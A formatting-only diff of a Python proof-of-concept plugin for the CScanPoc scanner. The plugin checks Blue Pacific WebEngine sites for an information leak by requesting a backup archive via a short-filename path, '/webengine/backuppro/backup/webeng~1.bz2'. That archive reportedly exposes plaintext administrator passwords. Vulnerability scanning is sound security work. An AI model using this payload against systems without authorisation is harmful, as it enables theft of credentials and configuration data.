@@ -2,13 +2,15 @@
 
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import re, urlparse
+import re
+import urlparse
+
 
 class Vuln(ABVuln):
     vuln_id = 'BluePacific_0001'  # 平台漏洞编号，留空
     name = '蓝太平洋网站决策支持系统WebEngine 信息泄露'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INFO_LEAK # 漏洞类型
+    type = VulnType.INFO_LEAK  # 漏洞类型
     disclosure_date = '2015-08-12'  # 漏洞公布时间
     desc = '''
         蓝太平洋网站决策支持系统WebEngine存在利用短文件漏洞下载明文系统配置文件(可泄漏管理员明文密码等系统敏感配置信息)
@@ -19,6 +21,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '蓝太平洋'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '64d9d206-6457-4603-891c-b8760dce2381'
@@ -33,13 +36,13 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #Refer:wooyun-2015-0132719
+            # Refer:wooyun-2015-0132719
             hh = hackhttp.hackhttp()
             arg = self.target
             payload = "/webengine/backuppro/backup/webeng~1.bz2"
             code, head, res, _, _ = hh.http(arg + payload)
             if code == 200 and 'application/x-bzip2' in head:
-                #security_warning(arg+payload)
+                # security_warning(arg+payload)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -48,6 +51,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
